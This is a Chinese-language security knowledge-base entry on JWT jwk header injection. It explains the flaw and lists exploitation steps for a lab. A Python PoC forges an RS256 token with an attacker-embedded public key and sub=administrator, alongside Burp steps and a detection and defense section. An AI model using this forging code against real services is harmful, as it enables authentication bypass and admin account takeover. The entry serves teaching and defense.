---
id: web-generic-jwt-jwk-header-injection
title: JWT jwk 头注入：服务端信任令牌内嵌公钥，攻击者自带密钥伪造管理员
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-jwk-header-injection
tags:
- jwt
- web
- auth
- jwk
- jwks
- rsa
- signature-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T03:45:59+08:00'
  notes: 已对照原文Lab4与图21-29核对：服务端支持 Header jwk 且不校验来源；Burp 新建 RSA 2048、改 sub=administrator、Embedded JWK 攻击后 /admin 200 并删除 carlos 成功。原文未给组件版本，未设置 affected_versions。未复现。
url: /docs/web/generic/jwt/web-generic-jwt-jwk-header-injection/
draft: false
kb_aliases:
- jwk 头注入
- Embedded JWK Attack
- 内嵌 JWK
- JWT 自带公钥
- jwk header injection
- JWT 信任令牌内公钥
---

## 一句话结论

JWT Header 支持 `jwk` 字段携带公钥；若服务端直接用令牌 Header 里的 JWK 作为验签公钥、且不校验该密钥是否来自可信来源，攻击者可自己生成 RSA 密钥对，把公钥写进 `jwk`、用对应私钥签名并篡改 `sub`，服务端会信任内嵌公钥并通过验签。

## 原理

- `jwk` 是 JWT Header 的扩展参数，允许把验证密钥（公钥）直接嵌在令牌里；它本应只用于特定可信场景（例如密钥已由其他机制认证）。
- 漏洞实现：服务端解析 Header 的 `jwk`，用其中的 `n`/`e` 构造公钥，再调用 `jwt.decode(token, public_key, algorithms=["RS256"])`。密钥来源完全由攻击者控制。
- 攻击者因此可以“自签自验”：
  1. 本地生成一对 RSA 密钥（如 2048 位）；
  2. Header 保持 `alg:RS256`，加入 `jwk`（自己的公钥，常同时设置 `kid`）；
  3. Payload 改为 `sub:administrator`；
  4. 用自己的私钥对 Header.Payload 做 RS256 签名。
- 服务端取出 Header 中的公钥验证该签名，必然通过；随后信任 Payload 中的管理员身份。
- 与 `jku` 的区别：`jku` 是让服务端去攻击者 URL 拉 JWKS；`jwk` 是把公钥直接放在令牌 Header 里，不需要外部托管。与 `kid` 的区别：`kid` 是密钥标识，`jwk` 直接携带密钥材料。

## 触发条件

- 服务端 JWT 验证实现支持并读取 Header 的 `jwk` 参数。
- 服务端把 Header 中的 JWK 当作验签公钥，未与预配置密钥/白名单比对。
- 目标使用非对称算法（如 RS256）。
- 攻击者能获得任意合法 JWT 以了解 Header 结构与 `kid` 命名。

## 利用步骤

1. 登录普通账号，抓取 JWT，解码确认 `alg=RS256`、`kid` 格式及 Payload 身份字段。
2. 本地生成 RSA 2048 密钥对，导出公钥 JWK（含 `kty`、`n`、`e`，可选 `kid`）。
3. 构造 Header：保留/设置 `kid`，加入 `jwk` 公钥对象，`alg` 仍为 `RS256`。
4. Payload 改为目标身份（如 `{"sub":"administrator"}`）。
5. 用私钥签名，替换会话 Cookie/Authorization。
6. 访问 `/admin`；成功后执行管理操作验证。

## PoC

```python
import json
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from jwt.algorithms import RSAAlgorithm

# 1. 攻击者自己的 RSA 密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_jwk = json.loads(RSAAlgorithm.to_jwk(private_key.public_key()))
public_jwk["kid"] = "<沿用或伪造一个 kid>"

# 2. Header 内嵌公钥，Payload 冒充管理员，用私钥签名
token = jwt.encode(
    {"sub": "administrator"},
    private_key,
    algorithm="RS256",
    headers={"jwk": public_jwk},
)
print(token)
```

```text
Burp JWT Editor 等价操作：Keys 中 New RSA Key 生成密钥 →
Repeater 的 JSON Web Token 选项卡把 sub 改为 administrator →
Attack → Embedded JWK；服务端若接受，则 /admin 返回 200。
```

## 变体与关联

- 变体：`jwk` 与 `kid` 组合——部分实现会先按 `kid` 查找密钥，找不到再回退到 Header `jwk`；需让 `kid` 与内嵌 JWK 的 `kid` 一致。
- 变体：`jku` 指向攻击者 JWKS 端点（见 [[web-generic-jwt-jku-header-hijack]]）；`x5u`/`x5c` 证书链参数若被信任也可能类似。
- 关联：[[web-generic-jwt-kid-injection]]（通过 kid 控制密钥选择）、[[web-generic-jwt-rs256-hs256-confusion]]（算法混淆）、[[web-generic-jwt-unverified-signature-payload-tamper]]（完全不验签）。
- 边界：服务端只使用预配置公钥、忽略 `jwk`，或校验 `jwk` 指纹与白名单一致时，本手法不成立。

## 检测与防御

- 修复：验签密钥只能来自服务端可信配置/受控 JWKS，忽略或直接拒绝 Header 中的 `jwk`、`jku`、`x5u`、`x5c` 等密钥来源参数。
- 加固：固定算法白名单；`kid` 只做服务端映射，不解析其中的密钥材料；校验签发者 `iss`、受众 `aud`；对密钥轮换使用受控发布流程。
- 检测：JWT Header 中出现 `jwk`/`jku`/`x5u`/`x5c`；`kid` 与内嵌 JWK 的 `kid` 同现；同一 `kid` 对应的公钥 `n` 发生变化；RS256 token 的验签公钥指纹不在白名单。监控管理接口的异常 200 响应与用户删除操作。
